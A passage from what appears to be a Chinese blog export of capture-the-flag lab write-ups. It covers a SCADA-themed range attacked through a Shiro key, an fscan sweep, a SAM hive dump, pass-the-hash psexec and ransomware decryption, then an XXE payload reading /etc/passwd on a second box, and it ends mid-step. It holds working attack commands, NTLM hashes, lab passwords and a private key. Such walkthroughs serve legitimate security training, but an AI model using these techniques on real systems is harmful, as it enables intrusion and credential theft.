java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*\nsun.arch.data.model = 64\nlogin.configuration.provider = sun.security.provider.ConfigFile\ncatalina.useNaming = false\nuser.timezone =\nsecurity.overridePropertiesFile = true\njava.vm.specification.version = 1.8\nos.name = Linux\nuser.country = US\nsecurity.provider.7 = com.sun.security.sasl.Provider\nsun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64\nsun.java.command = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar\nsecurity.provider.9 = sun.security.smartcardio.SunPCSC\njdk.security.caDistrustPolicies = SYMANTEC_TLS\nsun.cpu.endian = little\nuser.home = /root\nuser.language = en\njava.specification.vendor = Oracle Corporation\nen = UTF-8\nsecurity.provider.1 = sun.security.provider.Sun\nsecurity.provider.2 = sun.security.rsa.SunRsaSign\nsecurity.provider.3 = sun.security.ec.SunEC\nnetworkaddress.cache.negative.ttl = 10\njdk.tls.alpnCharset = ISO_8859_1\nsecurity.provider.4 = com.sun.net.ssl.internal.ssl.Provider\nsecurity.provider.5 = com.sun.crypto.provider.SunJCE\nsecurity.provider.6 = sun.security.jgss.SunProvider\nssl.KeyManagerFactory.algorithm = SunX509\nfile.separator = /\njava.specification.name = Java Platform API Specification\njava.vm.specification.vendor = Oracle Corporation\nFILE_LOG_CHARSET = UTF-8\n.level = INFO\njava.awt.graphicsenv = sun.awt.X11GraphicsEnvironment\nja = UTF-8\njava.awt.headless = true\ncom.xyz.foo.level = SEVERE\npackage.definition = sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.\nsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\njava.protocol.handler.pkgs = org.springframework.boot.loader\nsun.management.compiler = HotSpot 64-Bit Tiered Compilers\njava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08\npolicy.provider = sun.security.provider.PolicyFile\nuser.name = root\npolicy.url.1 = file:${java.home}/lib/security/java.policy\npath.separator = :\nfr = UTF-8\nsecurerandom.source = file:/dev/random\npolicy.url.2 = file:${user.home}/.java.policy\njdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize < 1024, EC keySize < 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurves\nos.version = 5.4.0-166-generic\njava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed\npolicy.ignoreIdentityScope = false\njava.runtime.name = OpenJDK Runtime Environment\nkeystore.type.compat = true\nfile.encoding = UTF-8\nspring.beaninfo.ignore = true\njava.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter\njava.vm.name = OpenJDK 64-Bit Server VM\njdk.sasl.disabledMechanisms =\njava.vendor.url.bug = http://bugreport.sun.com/bugreport/\njava.io.tmpdir = /tmp\njava.util.logging.FileHandler.formatter = java.util.logging.XMLFormatter\njava.util.logging.FileHandler.count = 1\ncatalina.home = /tmp/tomcat.8080.2227855515484347988\njava.version = 1.8.0_392\nsun.cds.enableSharedLookupCache = false\nsun.security.krb5.maxReferrals = 5\njdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37\nPID = 620\njava.vm.specification.name = Java Virtual Machine Specification\njava.awt.printerjob = sun.print.PSPrinterJob\nCONSOLE_LOG_CHARSET = UTF-8\njdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops\ncatalina.base = /tmp/tomcat.8080.2227855515484347988\njava.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib\njava.util.logging.FileHandler.limit = 50000\njava.vm.info = mixed mode, sharing\njava.vendor = Private Build\nkeystore.type = jks\njava.specification.maintenance.version = 5\nhandlers = java.util.logging.ConsoleHandler\nsun.io.unicode.encoding = UnicodeLittle\njava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext\npolicy.expandProperties = true\nsecurerandom.strongAlgorithms = NativePRNGBlocking:SUN\nkrb5.kdc.bad.policy = tryLast\n\n===========================================\nProcessEnvironment\n-------------\nnot found!\n\n===========================================\nOSS\n-------------\nnot found!\n\n===========================================\nUserPassSearcher\n-------------\norg.apache.shiro.web.filter.authc.FormAuthenticationFilter:\n[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]\n\norg.apache.catalina.startup.Tomcat:\n[hostname = localhost]\n\n\n===========================================\nCookieThief\n-------------\nnot found!\n\n===========================================\nAuthThief\n-------------\nnot found!\n\n===========================================\n~~~\n\n有用的是这里，存在一个shirokey，然后shiro一把梭，注入内存马\n\n~~~~\n===========================================\nCookieRememberMeManager(ShiroKey)\n-------------\nalgMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES\n~~~~\n\nflag01在根目录\n\n# FLAG02\n\n写一个公钥进去，ssh连接，上传一个fscan再做一个代理\n\nfscan扫一下内网\n\n~~~\nroot@security:~# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:2f:44:6e brd ff:ff:ff:ff:ff:ff\n    inet 172.22.17.213/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315359102sec preferred_lft 315359102sec\n    inet6 fe80::216:3eff:fe2f:446e/64 scope link\n       valid_lft forever preferred_lft forever\nroot@security:~# ./fscan2 -h 172.22.17.213/24\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-05-02 11:23:19] [INFO] 暴力破解线程数: 1\n[2025-05-02 11:23:19] [INFO] 开始信息扫描\n[2025-05-02 11:23:19] [INFO] CIDR范围: 172.22.17.0-172.22.17.255\n[2025-05-02 11:23:20] [INFO] 生成IP范围: 172.22.17.0.%!d(string=172.22.17.255) - %!s(MISSING).%!d(MISSING)\n[2025-05-02 11:23:20] [INFO] 解析CIDR 172.22.17.213/24 -> IP范围 172.22.17.0-172.22.17.255\n[2025-05-02 11:23:20] [INFO] 最终有效主机数量: 256\n[2025-05-02 11:23:20] [INFO] 开始主机扫描\n[2025-05-02 11:23:20] [SUCCESS] 目标 172.22.17.6     存活 (ICMP)\n[2025-05-02 11:23:20] [SUCCESS] 目标 172.22.17.213   存活 (ICMP)\n[2025-05-02 11:23:23] [INFO] 存活主机数量: 2\n[2025-05-02 11:23:23] [INFO] 有效端口数量: 233\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:445\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:139\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:135\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:21\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:80\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.213:22\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.213:8080\n[2025-05-02 11:23:23] [SUCCESS] 服务识别 172.22.17.6:21 => [ftp] 产品:Microsoft ftpd 系统:Windows Banner:[220 Microsoft FTP Service.]\n[2025-05-02 11:23:23] [SUCCESS] 服务识别 172.22.17.213:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]\n[2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.6:445 =>\n[2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.6:139 =>  Banner:[.]\n[2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.213:8080 => [http]\n[2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.6:80 => [http]\n[2025-05-02 11:24:28] [SUCCESS] 服务识别 172.22.17.6:135 =>\n[2025-05-02 11:24:28] [INFO] 存活端口数量: 7\n[2025-05-02 11:24:28] [INFO] 开始漏洞扫描\n[2025-05-02 11:24:28] [INFO] 加载的插件: findnet, ftp, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-05-02 11:24:28] [SUCCESS] 网站标题 http://172.22.17.6        状态码:200 长度:661    标题:172.22.17.6 - /\n[2025-05-02 11:24:28] [SUCCESS] NetBios 172.22.17.6     WORKGROUP\\WIN-ENGINEER\n[2025-05-02 11:24:28] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.17.6\n主机名: WIN-ENGINEER\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.17.6\n[2025-05-02 11:24:28] [SUCCESS] 网站标题 http://172.22.17.213:8080 状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.17.213:8080/login;jsessionid=AE53E4C807EB6DEB9B204E7B4201FDFF\n[2025-05-02 11:24:28] [SUCCESS] 匿名登录成功!\n[2025-05-02 11:24:28] [SUCCESS] 网站标题 http://172.22.17.213:8080/login;jsessionid=AE53E4C807EB6DEB9B204E7B4201FDFF 状 态码:200 长度:2936   标题:火创能源监控画面管理平台\n[2025-05-02 11:24:29] [SUCCESS] 目标: http://172.22.17.213:8080\n  漏洞类型: poc-yaml-spring-actuator-heapdump-file\n  漏洞名称:\n  详细信息:\n        author:AgeloVito\n        links:https://www.cnblogs.com/wyb628/p/8567610.html\n[2025-05-02 11:24:30] [SUCCESS] 目标: http://172.22.17.213:8080\n  漏洞类型: poc-yaml-springboot-env-unauth\n  漏洞名称: spring2\n  详细信息:\n        links:https://github.com/LandGrey/SpringBootVulExploit\n~~~\n\n~~~\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:445\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:139\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:135\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:21\n[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:80\n~~~\n\n先看ftp，可以匿名登陆但是中文会乱码，和80端口的文件是一样的，随便在一个服务下载就行\n\n内部通知.docx告诉我们了密码规则\n\n~~~\n登陆账户设置：\n   为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为zhangsan，工号为0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。\n~~~\n\n还存在一个通讯录，根据通讯录里的信息和这个密码规则可以构造，有好多账号都可以登陆，任意一个就可以\n\n~~~\nchenhua/chenhua@0813\n~~~\n\nrdp连接，scad.txt还给了一个管理员的密码\n\n~~~\nWIN-SCADA: 172.22.26.xx\nUsername: Administrator\nPassword: IYnT3GyCiy3\n~~~\n\n但是这不是这台主机的管理员密码，题目提示\n\n~~~\n关卡剧情：\n尝试接管 SCADA 工程师的个人 PC，并通过滥用 Windows 特权组提升至系统权限。\n~~~\n\n查看当前用户组\n\n~~~\nC:\\Users\\chenhua>net user chenhua\n用户名                 chenhua\n全名\n注释\n用户的注释\n国家/地区代码          000 (系统默认值)\n帐户启用               Yes\n帐户到期               从不\n\n上次设置密码           2023/12/26 0:47:03\n密码到期               从不\n密码可更改             2023/12/26 0:47:03\n需要密码               Yes\n用户可以更改密码       Yes\n\n允许的工作站           All\n登录脚本\n用户配置文件\n主目录\n上次登录               2025/5/2 11:36:30\n\n可允许的登录小时数     All\n\n本地组成员             *Backup Operators     *Remote Desktop Users\n                       *Users\n全局组成员             *None\n命令成功完成。\n\n~~~\n\n我们在`Backup Operators`组内，但是没给用户分配SeBackup特权，可以用注册表 SAM 转储提权，直接转储 sam 和 system \n\n~~~\nPS C:\\users\\chenhua\\Desktop> reg save hklm\\sam sam.hive\n操作成功完成。\nPS C:\\users\\chenhua\\Desktop> reg save hklm\\system system.hive\n操作成功完成。\n~~~\n\n然后用secretsdump导出hash\n\n~~~\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a2fa2853651307ab9936cc95c0e0acf5:::\nchentao:1000:aad3b435b51404eeaad3b435b51404ee:47466010c82da0b75328192959da3658:::\nzhaoli:1001:aad3b435b51404eeaad3b435b51404ee:2b83822caab67ef07b614d05fd72e215:::\nwangning:1002:aad3b435b51404eeaad3b435b51404ee:3c52d89c176321511ec686d6c05770e3:::\nzhangling:1003:aad3b435b51404eeaad3b435b51404ee:8349a4c5dd1bdcbc5a14333dd13d9f81:::\nzhangying:1004:aad3b435b51404eeaad3b435b51404ee:8497fa5480a163cb7817f23a8525be7d:::\nlilong:1005:aad3b435b51404eeaad3b435b51404ee:c3612c48cf829d1149f7a4e3ef4acb8a:::\nliyumei:1006:aad3b435b51404eeaad3b435b51404ee:63ddcde0fa219c75e48e2cba6ea8c471:::\nwangzhiqiang:1007:aad3b435b51404eeaad3b435b51404ee:5a661f54da156dc93a5b546ea143ea07:::\nzhouyong:1008:aad3b435b51404eeaad3b435b51404ee:5d49bf647380720b9f6a15dbc3ffe432:::\nchenhua:1009:aad3b435b51404eeaad3b435b51404ee:07ff24422b538b97f3c297cc8ddc7615:::\n~~~\n\n\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# impacket-psexec  -hashes aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279 Administrator@172.22.17.6\n\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 172.22.17.6.....\n[*] Found writable share ADMIN$\n[*] Uploading file odkqcbIH.exe\n[*] Opening SVCManager on 172.22.17.6.....\n[*] Creating service CFcL on 172.22.17.6.....\n[*] Starting service CFcL.....\n[!] Press help for extra shell commands\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\nMicrosoft Windows [�汾 10.0.20348.2113]\n\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\n(c) Microsoft Corporation����������Ȩ����\n\n\nC:\\Windows\\system32> type C:\\Users\\Administrator\\flag\\flag02.txt\n~~~\n\n# FLAG03\n\n之前给的排上用场了，用fscan扫一下\n\n~~~\nWIN-SCADA: 172.22.26.xx\nUsername: Administrator\nPassword: IYnT3GyCiy3\n~~~\n\n~~~\nroot@security:~# ./fscan2 -h 172.22.26.1/24\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-05-02 12:42:59] [INFO] 暴力破解线程数: 1\n[2025-05-02 12:42:59] [INFO] 开始信息扫描\n[2025-05-02 12:42:59] [INFO] CIDR范围: 172.22.26.0-172.22.26.255\n[2025-05-02 12:42:59] [INFO] 生成IP范围: 172.22.26.0.%!d(string=172.22.26.255) - %!s(MISSING).%!d(MISSING)\n[2025-05-02 12:42:59] [INFO] 解析CIDR 172.22.26.1/24 -> IP范围 172.22.26.0-172.22.26.255\n[2025-05-02 12:42:59] [INFO] 最终有效主机数量: 256\n[2025-05-02 12:42:59] [INFO] 开始主机扫描\n[2025-05-02 12:42:59] [SUCCESS] 目标 172.22.26.11    存活 (ICMP)\n[2025-05-02 12:43:02] [INFO] 存活主机数量: 1\n[2025-05-02 12:43:02] [INFO] 有效端口数量: 233\n[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:135\n[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:139\n[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:80\n[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:1433\n[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:445\n[2025-05-02 12:43:07] [SUCCESS] 服务识别 172.22.26.11:139 =>  Banner:[.]\n[2025-05-02 12:43:07] [SUCCESS] 服务识别 172.22.26.11:1433 => [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]\n[2025-05-02 12:43:07] [SUCCESS] 服务识别 172.22.26.11:445 =>\n[2025-05-02 12:43:08] [SUCCESS] 服务识别 172.22.26.11:80 => [http]\n~~~\n\n远程桌面连接，登陆后会自动启动软件，然后开启锅炉得到flag\n\n# FLAG04\n\n桌面上有一个解密你的文件.txt\n\n~~~\n** 您的文件已被加密 **\n\n很抱歉，您的计算机中的文件已被加密。要解锁您的文件，您需要支付赎金。\n\n-----------------------------------------\n| 注意事项                               |\n-----------------------------------------\n| 1. 不要试图删除或修改加密文件。        |\n| 2. 支付赎金前，不要尝试恢复文件。      |\n| 3. 请在规定时间内支付赎金。            |\n-----------------------------------------\n\n要获取解密密钥和进一步的说明，请访问我们的支付网站：\n[支付网站链接]\n\n如果无法访问支付网站，请通过电子邮件联系我们：\ncontact@ransomware.com\n\n赎金金额：2比特币\n\n-----------------------------------------\n| 警告：尝试恢复文件或报警将导致永久丢失文件。|\n-----------------------------------------\n\n比特币支付地址：1ABcDefGhijxLxnxpxrsxUvwxYZabcdEf\n~~~\n\n桌面上还给了两个.lock文件，附件还给了两个key，c盘还有一个Lockyou.exe\n\n用dnSpy反编译可以看到加密逻辑根据 locky 勒索软件家族加解密逻辑和 .NET 逆向代码，解密思路如下：\n\n- 首先用 `privateKey` 对加密的 `encryptedAesKey`进行 RSA 解密，得到 `AES_KEY`。\n\n- 再用 `AES_KEY` 对加密的文件 `ScadaDB.sql.locky` 解密，得到 `ScadaDB.sql`\n\n  通过[工具](https://www.ssleye.com/ssltool/pem_xml.html)，将 `privateKey` 从 XML 格式转换为 PEM 格式，得到 `PRIVATE_KEY`：\n\n通过[工具](https://www.ssleye.com/ssltool/pem_xml.html)，将 `privateKey` 从 XML 格式转换为 PEM 格式，得到 `PRIVATE_KEY`：\n\n~~~\n-----BEGIN PRIVATE KEY-----\nMIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+\nPyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3\nYiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr\nrtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17\n8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox\nRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN\nUM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz\nJ5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ\nvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk\nVfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/\nxYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0\nVJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd\nFiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy\nPHvLZB6D8zSyuGw=\n-----END PRIVATE KEY-----\n~~~\n\n可以解出key是：\n\n~~~\ncli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=\n~~~\n\n使用 `AES KEY` 对文件 `ScadaDB.sql.locky` 进行解密。RSA + AES 解密的完整脚本如下：\n\n```python\n# -*- coding: utf-8 -*-\n# @Author  : iker\n# @Time    : 2024/03/04 16:10\n# @Function: RSA Privatekey Decryption & AES CBC Decryption\nimport base64\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Cipher import AES\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5\n\n\ndef rsa_decrypt(data):\n    private_key = \"\"\"-----BEGIN PRIVATE KEY-----\nMIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+\nPyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3\nYiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr\nrtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17\n8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox\nRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN\nUM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz\nJ5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ\nvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk\nVfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/\nxYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0\nVJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd\nFiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy\nPHvLZB6D8zSyuGw=\n-----END PRIVATE KEY-----\"\"\"\n    data = base64.b64decode(data)\n    priobj = Cipher_pkcs1_v1_5.new(RSA.importKey(private_key))\n    decrypted_data = priobj.decrypt(data,None)\n    return decrypted_data\n\n\ndef padding(data):\n    # style(string) – Padding algorithm.It can be ‘pkcs7’ (default), ‘iso7816’ or ‘x923’.\n    if len(data) % AES.block_size != 0:\n        return pad(data, AES.block_size, 'pkcs7')\n    else:\n        return data\n\ndef aes_cbc_encrypt(iv, key, data):\n    key = padding(key)\n    data = padding(data)\n    iv = padding(iv)\n\n    aes = AES.new(key, AES.MODE_CBC, iv)\n    cipher_data = aes.encrypt(data)\n    return cipher_data\n\ndef aes_cbc_decrypt(iv, key, data):\n    iv = padding(iv)\n    key = padding(key)\n    data = padding(data)\n\n    aes = AES.new(key, AES.MODE_CBC, iv)\n    data = aes.decrypt(data)\n    return data\n\ndef decrypt_file(encrypted_filepath,output_filepath,key):\n    with open(encrypted_filepath, 'rb') as f:\n        data = f.read()\n\n    iv = b'\\x00' * 16\n    decryption_result = aes_cbc_decrypt(iv, key, data)\n\n    with open(output_filepath, 'wb') as f:\n        f.write(decryption_result)\n\nif __name__ == \"__main__\":\n    encryptedAesKey = \"lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=\"\n    key = rsa_decrypt(encryptedAesKey)\n    encrypted_filepath = \"ScadaDB.sql.locky\"\n    output_filepath = \"ScadaDB.sql\"\n    decrypt_file(encrypted_filepath,output_filepath,key)\n```\n\n运行解密出ScadaDB.sql,flag4在数据库里\n","tags":["靶机"],"categories":["春秋云镜"]},{"title":"群友机-Bamuwe","url":"/2025/04/30/群友靶机-Bamuwe/","content":"\n\n\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:38:e9:13       PCS Systemtechnik GmbH\n192.168.31.171  08:00:27:59:20:9a       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.396 seconds (106.84 hosts/sec). 3 responded\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.171\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 03:50 EDT\nNmap scan report for 192.168.31.171\nHost is up (0.0017s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:59:20:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.80 seconds\n~~~\n\n# 80端口\n\n前端有一段注释\n\n~~~\n        <!-- XML STRUCTURE EXAMPLE -->\n        <!--\n        <user>\n          <name>John Doe</name>\n          <tel>123-4567890</tel>\n          <email>admin@admin.com</email>\n          <password>secret123</password>\n        </user>\n        -->\n~~~\n\n很明显的xxe提示\n\n~~~\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [  \n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n <user>\n          <name>John Doe</name>\n          <tel>123-4567890</tel>\n          <email>&xxe;</email>\n          <password>secret123</password>\n        </user>\n~~~\n\n可以读取到文件，知道有一个welcome用户，可以直接读取user.txt\n\n# 提权\n\n读取/home/welcome/.viminfo，他告诉你要去读取pass.txt,pass.txt里告诉了welcome的密码，ssh登录\n\n~~~\nwelcome@Bamuwe:~$ sudo -l\nMatching Defaults entries for welcome on Bamuwe:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Bamuwe:\n    